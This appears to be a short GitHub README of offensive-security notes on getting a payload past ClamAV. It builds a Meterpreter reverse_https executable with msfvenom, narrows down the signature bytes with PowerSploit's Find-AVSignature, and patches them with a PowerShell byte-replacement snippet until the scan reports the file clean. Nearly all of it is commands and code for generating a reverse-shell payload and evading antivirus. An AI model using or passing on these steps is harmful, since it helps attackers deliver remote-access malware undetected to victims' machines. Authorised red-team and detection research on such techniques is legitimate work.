# Bypass-by-changing-bytes
Bypass clamav by changing byte of payload. 
Utilize 
https://github.com/PowerShellMafia/PowerSploit/blob/master/AntivirusBypass/Find-AVSignature.ps1

payload 
msfvenom -p windows/x64/meterpreter/reverse_https lhost=eth0 lport=443 -f exe -o met.exe      

Split payload using example
Find-AVSignature -StartByte 29000 -EndByte max -Interval 100 -Path C:\Users\test\Desktop\met_mod2.exe -OutPath C:\Users\test\Desktop\tools\test23 -Verbose -Force
![image](https://github.com/user-attachments/assets/0c228c37-26b7-404b-aa6c-7e4184e16ce1)

Goal is to get the byte down to 1 
![image](https://github.com/user-attachments/assets/3d2dc767-5fdc-448e-9470-7487bc4515d7)

Find-AVSignature -StartByte 29239 -EndByte 29250 -Interval 100 -Path C:\Users\test\Desktop\met_mod2.exe -OutPath C:\Users\test\Desktop\tools\test23 -Verbose -Force
![image](https://github.com/user-attachments/assets/60aae1d6-2e71-4c3b-aa7d-3f4d2a2121c1)

Replace with the following powershell
Replace first byte with the first clean byte 
![image](https://github.com/user-attachments/assets/3020c57f-040d-40f8-8529-18e5a11aaf5e)

Replace last byte with total of split byte
![image](https://github.com/user-attachments/assets/d0fc75ae-add3-4659-b8ce-b22fbb06d823)

$bytes  = [System.IO.File]::ReadAllBytes("C:\Users\test\Desktop\met.exe ")
$bytes[29239] = 0
$bytes[73801] = 0xFF
[System.IO.File]::WriteAllBytes("C:\Users\test\Desktop\met_mod3.exe", $bytes)

scan with clam show clean
![image](https://github.com/user-attachments/assets/06da9cfc-c3e5-4f2b-802f-c28342ac21ca)
